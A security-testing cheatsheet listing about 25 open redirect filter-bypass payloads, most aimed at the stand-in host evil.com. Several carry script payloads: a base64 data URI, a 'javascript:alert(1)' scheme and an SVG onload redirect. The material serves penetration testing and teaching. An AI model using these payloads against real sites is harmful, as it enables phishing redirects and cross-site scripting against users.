# Manual Open Redirect Testing (Cheatsheet)

Open Redirect vulnerabilities occur when an application redirects users to a URL controlled by attacker input without proper validation.

---

## 1️⃣ Basic Domain Replacement

**Test if redirect parameter is directly trusted**

```text
?redirect=https://example.com
→ ?redirect=https://evil.com
```

---

## 2️⃣ Protocol-Relative URLs (Bypass Protocol Filters)

If `http://` or `https://` is blocked:

```text
?redirect=//evil.com
```

---

## 3️⃣ Backslash Bypass

If double slash (`//`) is blocked:

```text
?redirect=\\evil.com
```

Some parsers normalize `\` → `/`.

---

## 4️⃣ Missing Slash Protocol Bypass

If `https://` is blacklisted:

```text
?redirect=https:evil.com
```

Browsers may still treat it as a valid URL.

---

## 5️⃣ @ Symbol (%40) Userinfo Bypass

If validation checks only the first domain:

```text
?redirect=example.com@evil.com
?redirect=example.com%40evil.com
```

Browser resolves **evil.com** as destination.

---

## 6️⃣ Domain Concatenation Bypass

If app checks for `example.com` substring:

```text
?redirect=example.comevil.com
```

---

## 7️⃣ Dot Encoding (%2e)

```text
?redirect=example.com%2eevil.com
```

Some filters fail to normalize encoded dots.

---

## 8️⃣ Question Mark Confusion

```text
?redirect=evil.com?example.com
```

Application may incorrectly parse the URL.

---

## 9️⃣ Fragment Identifier (%23 / #)

```text
?redirect=evil.com#example.com
?redirect=evil.com%23example.com
```

Everything after `#` is ignored by the server.

---

## 🔟 Path Injection

```text
?redirect=example.com/evil.com
```

Works when only domain prefix is validated.

---

## 1️⃣1️⃣ Unicode / International Dot Bypass

```text
?redirect=evil.com%E3%80%82example.com
```

Uses **Unicode fullwidth dot** instead of `.`

---

## 1️⃣2️⃣ CRLF / Null Byte Injection

```text
?redirect=/%0d/evil.com
?redirect=/%0a/evil.com
```

Can break header parsing in weak implementations.

---

## 1️⃣3️⃣ URL-Encoded Redirects

```text
?url=http%3A%2F%2Fmalicious.com
```

Some apps decode input *after* validation.

---

## 1️⃣4️⃣ Path-Based Redirects

```text
/redirect/http://malicious.com
```

Common in frameworks using path routing.

---

## 1️⃣5️⃣ Data URI Redirects

```text
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Leads to **XSS + redirect chain** in some browsers.

---

## 1️⃣6️⃣ JavaScript Scheme Redirects

```text
?url=javascript:alert(1);//
```

Works if scheme validation is missing.

---

## 1️⃣7️⃣ HTTP Header-Based Redirects

Test when you control headers:

```http
Location: http://evil.com
Refresh: 0; url=http://evil.com
X-Forwarded-Host: evil.com
```

Seen in misconfigured reverse proxies.

---

## 1️⃣8️⃣ Path Traversal Hybrid

```text
?url=/../../https://evil.com
```

Improper normalization leads to external redirect.

---

## 1️⃣9️⃣ SVG-Based Redirect Payload

```xml
<svg onload="window.location='https://evil.com/'"
     xmlns="http://www.w3.org/2000/svg"></svg>
```

Useful when SVG upload + inline rendering exists.

---

## 2️⃣0️⃣ Case-Sensitive Bypasses

```text
//GOOGLE.com/
//GoOgLe.com/
```

Bypasses poorly normalized filters.

---

## 2️⃣1️⃣ Trailing Special Characters

```text
//google.com/#/
//google.com/;&/
//google.com/?id=1&//
```

Confuses string-based validation.

---

## 2️⃣2️⃣ IP Address Variants

```text
http://3232235777        (Decimal)
http://0xC0A80001       (Hex)
http://192.168.1.1
```

Some filters only block domain names.

---

## 2️⃣3️⃣ IPv6 Notation

```text
http://[::1]/
http://[::ffff:192.168.1.1]/
```

Often missed in legacy validation logic.

---

## 2️⃣4️⃣ Non-Standard Ports

```text
http://google.com:81
https://google.com:444
```

Port-based bypass when only domain is checked.

---

## 2️⃣5️⃣ Unicode Path Obfuscation

```text
/%E2%80%8Ehttp://google.com
/%C2%A0http://google.com
```
